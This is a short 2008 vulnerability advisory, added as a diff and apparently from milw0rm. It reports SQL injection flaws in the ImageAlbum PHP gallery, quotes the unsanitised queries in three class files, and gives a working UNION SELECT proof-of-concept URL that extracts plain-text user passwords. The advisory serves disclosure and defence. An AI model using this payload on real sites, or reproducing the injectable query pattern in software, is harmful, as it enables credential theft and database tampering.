@@ -1,0 +1,48 @@
+ImageAlbum Remote SQL Injection Vulnerabilities
+-------------------------------------------------------------------------
+
+Product: ImageAlbum
+Version: Latest 2.0.0b2, others not tested
+Vendor:  http://imagealbum.sourceforge.net/
+Date:     01/10/08
+
+- Introduction
+
+ImageAlbum is a web application written in PHP for displaying and editing
+picture collections.  It features user accounts and picture comments.
+
+- Details
+
+Multiple SQL injection vulnerabilities exist, that can result in user
+credentials being compromised or the modification of the database.
+
+In classes/IADomain.php
+$sql = "SELECT * FROM `iaimage`
+WHERE `id` = $id AND `domain_id` = $this->id LIMIT 1";
+
+In classes/IACollection.php
+$sql = "SELECT * FROM `iacollection` WHERE `id` = $this->id";
+
+In classes/IAUser.php
+$sql = "SELECT * FROM `iauser` WHERE `id` = $this->id";
+
+Other SQL statements in the application are also vulnerable.
+
+- Proof of Concept
+
+The following example exploits the image viewer page by placing the password
+of a user into the src attribute of the img tag instead of the correct path
+to the image.  User passwords are stored in plain-text.
+
+http://[site]/index.php/[domain]/?action=collection.imageview&id=643635 union all select iaimage.id, iaimage.name, description, iaimage.collection_id, iaimage.domain_id, password As path, access, visits, checked FROM iaimage, iauser WHERE iaimage.id=411 /*
+
+Note, 643635 is an invalid image id and 411 is a known valid image id.
+
+- Solution
+
+Edit the source code to insure that all user input is properly sanitised.
+
+Cheers,
+dB <dB [at] rawsecurity ! org>
+
+# milw0rm.com [2008-01-11]
